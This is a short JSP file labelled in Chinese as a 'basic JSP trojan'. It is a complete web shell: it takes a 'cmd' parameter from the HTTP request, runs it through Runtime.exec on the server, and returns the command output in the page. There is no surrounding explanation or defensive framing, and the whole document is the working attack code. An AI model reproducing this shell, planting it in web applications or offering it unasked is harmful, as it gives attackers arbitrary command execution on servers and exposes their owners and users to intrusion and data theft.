//基础jsp马
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<body>
<%
    Runtime runtime = Runtime.getRuntime();
    String cmd = request.getParameter("cmd");
    Process process = runtime.exec(cmd);
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
</body>
</html>